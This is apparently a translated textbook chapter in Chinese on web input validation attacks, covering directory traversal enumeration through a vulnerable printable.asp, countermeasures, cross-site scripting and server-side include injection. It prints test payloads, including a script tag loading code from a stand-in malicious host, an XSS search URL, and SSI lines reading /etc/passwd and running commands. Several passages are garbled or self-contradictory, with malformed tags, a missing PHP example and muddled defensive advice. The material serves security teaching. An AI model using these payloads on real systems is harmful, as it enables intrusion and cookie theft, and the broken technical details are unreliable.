

# 第8章：输入验证攻击

注意：我们发现的 `printable.asp` 文件容易受到这种攻击，因为该文件没有执行输入验证。从文件中的单行代码可以清楚地看到：
Link = "D:\server\data\publishing\documents\&Request.QueryString("Link")"
注意这深度到了多少层？

错误代码可以帮助枚举目录。我们将使用如“Path not found”（未找到路径）和“Permission denied”（拒绝访问）等信息来追踪 Web 服务器上的目录。回到上一个例子，我们将使用 `printable.asp` 来枚举目录：

- 发送: /includes/printable.asp?Link=../../../inetpub
返回: Microsoft VBScript runtime error '800a0046'
Permission denied
/includes/printable.asp, line 10
- 发送: /includes/printable.asp?Link=../../../../inetpub/borkork
返回: Microsoft VBScript runtime error '800a0046'
Path not found
/includes/printable.asp, line 10
- 发送: /includes/printable.asp?Link=../data
返回: Microsoft VBScript runtime error '800a0046'
Permission denied
/includes/printable.asp, line 10
- 发送: /includes/printable.asp?Link=../../../../Program%20Files/
返回: Microsoft VBScript runtime error '800a0046'
Permission denied
/includes/printable.asp, line 10

这些结果告诉我们我们验证了什么。如果 `/inetpub` 和 "Program Files" 目录存在，但我们没有它们的读取权限。如果是这样，目录内容将被列出来。如果 `/inetpub/borkork` 目录返回“Permission denied”错误，那么这种技术就失败了。该技术之所以有效是因为应用程序能够区分存在的目录/文件与不存在的目录/文件。最后，我们发现了一个 `/data` 目录。该目录位于通往 `printables.asp` 的神秘路径之中。

总结枚举文件的步骤：

- 示例代码。确定应用程序对于不存在的文件、不存在的目录、存在的文件（但可能被拒绝读取访问）以及存在的目录是否会返回不同的错误。
- 找到根目录。添加目录遍历字符，直到你可以确定驱动器号或根目录的位置。
- 向 Web 文档根目录移动。Web 文档根目录下的文件很容易枚举。当我们开始调查应用程序时，你应该已经列出了它们的大部分。这些文件更容易找到，因为它们是已知的属性。
- 寻找常用目录。寻找临时目录（/temp, /tmp, /var）、程序目录（/Program Files, /bin, /winnt, /usr/bin）以及热门目录（/home, /etc, /downloads, /backup）。
- 尝试访问目录。如果应用程序对目录有读取权限，它将列出目录内容。突然，你的工作变得简单得多了！

Web 应用程序测试人员的笔记本应该包含带有 Web 服务器的常用程序的递归目录列表。拥有目录和配置文件的引用将大大提高目录遍历攻击的成功率。应用程序列表应该包括如 Lotus Domino、Microsoft Site Server 和 Apache Tomcat 等程序。

# 应对措施

防御规范化攻击（canonicalization attacks）的最佳方法是移除所有的点（`.`）。解析引擎引擎还应该捕获 Unicode 和十六进制中的点。

强制所有操作从特定目录开始进行。然后允许文件名之前的所有路径信息。例如，`/path1/path2../path3/file` 应该被简化为 `/file`。

安全文件权限也能缓解这种攻击。首先，以最小权限用户运行 Web 服务器。这在 UNIX 系统上等同于 "nobody" 账户，在 Windows 系统上等同于 "Guest" 账户。接下来，限制服务器账户使其只能读取与 Web 应用程序特定的目录下的文件。

将敏感文件（如 `*.*` 文件）从文档根目录移动到 Web 服务器仍可以访问的目录。这可以缓解仅限于查看文档根目录内文件的目录攻击。服务器仍然能够访问文件，但用户无法读取它们。

# 脚本攻击

这种攻击有两个前提条件。首先，应用程序必须接受用户输入。这听起来是显而易见的；然而，输入并非来自表单字段。我们将列出一些可以在 URL 上测试的方法。其次，应用程序必须显示用户输入。当应用程序渲染数据，且数据变成 Web 浏览器解释的 HTML 标签时，攻击就会发生。

# 第8章：输入验证攻击

例如，这里有两个显示查询结果的 HTML 源代码片段：
源: 37 items found for <b>&lt;i&gt;test4&lt;/i&gt;</b>
显示: 37 items found for <i>test</i>
源: 37 items found for <b>&lt;i&gt;test&lt;/i&gt;</b>
显示: 37 items found for <i>test</i>

# 跨站脚本 (CSS/XSS)

跨站攻击（CSS）在其他用户可以看到的位置[放置]恶意代码（通常是 JavaScript）。表单中的目标字段可以是地址、公告板评论等。恶意代码通常会窃取 cookie，这允许攻击者冒充受害者，或进行社会工程攻击，这可能会诱骗受害者泄露其密码。Hotmail 和 AOL 就一直受到这种类型社会工程攻击的困扰。

测试一个应用程序是否容易受到 CSS 攻击。这并不是为了写一篇关于 JavaScript 的论文或操纵浏览器漏洞的过度技巧。这里有三种方法，如果成功，则表明应用程序存在漏洞：

```
<script>document.cookie()</script>
<script>alert('Salut!')</script>
<script src="http://malicious-host/badscript.js"></script>
```

注意最后一行可以调用 JavaScript。这种脚本攻击 URL 绕过了长度限制，因为 `badscript.js` 文件可以是任意长度。这些测试很容易执行。在表单中输入字符串看看会发生什么。

还有其他方法执行 CSS 攻击。正如我们之前提到的，应用程序的搜索引擎是 CSS 攻击的主要目标。在输入框中输入内容并提交到 URL：

```
http://www.victim.com/search.pl?query=<script>alert('foo')</script>
```

发现错误页面经常受到 CSS 攻击。例如，URL 看起来像：

http://www.victim.com/inc/errors.asp?Error=Invalid%20password

这是一个显示“Invalid password”的自定义拒绝页面。在页面内容中看到字符串是 CSS 漏洞的极大指标。攻击创建如下：

```
http://www.victim.com/inc/errors.asp?Error=<script%20src=...
```

这就是脚本攻击 URL。此时你应该已经了解如何进行这些测试。

# 嵌入脚本

嵌入脚本是跨站脚本的流行，但它们并不罕见。CSS 攻击针对应用程序的其他用户。嵌入脚本攻击应用程序本身。在这种情况下，恶意代码不是一对 `<script>` 标签，而是格式标签。这包括 SSI 指令、ASP 标签、PHP 标签、SQL 查询结构，甚至是 HTML 标签。目标是提交的数据在应用程序显示时，作为程序指令执行或破坏 HTML 输出。程序执行可以攻击者访问服务器变量，如密码和文档根目录之外的文件。不用说，这对应用程序构成了巨大风险。如果嵌入脚本合并了输出，攻击者可能会看到未正确执行的源代码。这可能会暴露敏感应用程序数据。执行测试分为几类。应用程序审核不需要复杂的恶意代码。如果嵌入 ASP 日期函数返回当前日期，那么应用程序的输入验证程序是不够的。ASP 代码非常危险，它可以执行任意命令或访问任意文件：

```
<= date() %

<!----include virtual="global.asa" -->
<!----include file="/etc/passwd" -->
<!----exec cmd="/sbin/ifconfig -a" -->
```

嵌入 Java 和 JSP 同样危险：

```
<% java.util.Date today = new java.util.Date(); out.println(today); %
```

最后，我们想要伪造 PHP：

如果这些任何一种方法有效，那么应用程序存在严重问题。语言标签如 `<<?` 或 `<%` 通常在处理用户输入之前处理。这并不意味着额外的 `%%>` 不会破坏 JSP 文件，但如果失败了，也不要太失望。

